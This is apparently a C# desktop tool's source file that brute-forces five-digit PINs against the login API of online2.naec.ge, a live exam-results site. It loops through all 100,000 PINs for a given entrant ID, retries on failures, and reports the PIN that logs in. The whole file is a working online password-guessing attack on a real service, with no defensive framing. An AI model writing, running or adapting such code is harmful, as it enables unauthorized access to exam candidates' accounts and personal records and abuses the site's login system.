using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Newtonsoft.Json;

namespace Naec_Checker
{
    public static class Extensions
    {
        public static StringContent AsJson(this object o) => new StringContent(JsonConvert.SerializeObject(o), Encoding.UTF8, "application/json");
    }

    class Checker
    {
        public HttpClient client;
        public List<string> pins;
        public string loginUrl = "https://online2.naec.ge/uee-res/api/login";
        public string succKey = "EntrantId";
        public string failKey = "err";
        public string id;
        public bool found;
        public MainWindow window;
        public string foundPin;

        public Checker(string ID, MainWindow mainWindow)
        {
            id = ID;
            window = mainWindow;

            found = false;
            client = new HttpClient();
            pins = GetPins();
        }

        public List<string> GetPins()
        {
            List<string> numbers = new List<string>();

            for (int n = 0; n < 100000; n++)
            {
                numbers.Add(n.ToString().PadLeft(5, '0'));
            }

            Console.WriteLine("Got Pins");

            return numbers;
        }

        public void ThreadTask()
        {
            foreach (string pin in pins)
            {

                if (!found)
                {
                    double complete = 100 * pins.IndexOf(pin) / 100000;
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        window.changeProgress(complete);
                    });
                    MakeRequest(pin);
                    Thread.Sleep(5);
                } else if (found)
                {
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                         window.idInput.Text = "PIN: " + foundPin.ToString();
                    });
                }
            }
        }

        async public void MakeRequest(string pin)
        {
            var data = new { user = id, password = pin };

            try
            {
                var request = await client.PostAsync(loginUrl, data.AsJson());
                var response = await request.Content.ReadAsStringAsync();

                if (response.Contains(failKey))
                {
                    Console.WriteLine(String.Format("Checked {0}", pin));
                }
                else if (response.Contains(succKey))
                {
                    Console.WriteLine(String.Format("PIN: {0}", pin));
                    found = true;
                    foundPin = pin;
                }
                else
                {
                    Console.WriteLine(response);
                    MakeRequest(pin);
                }
            }
            catch (HttpRequestException)
            {
                MakeRequest(pin);
            }
        }
    }
}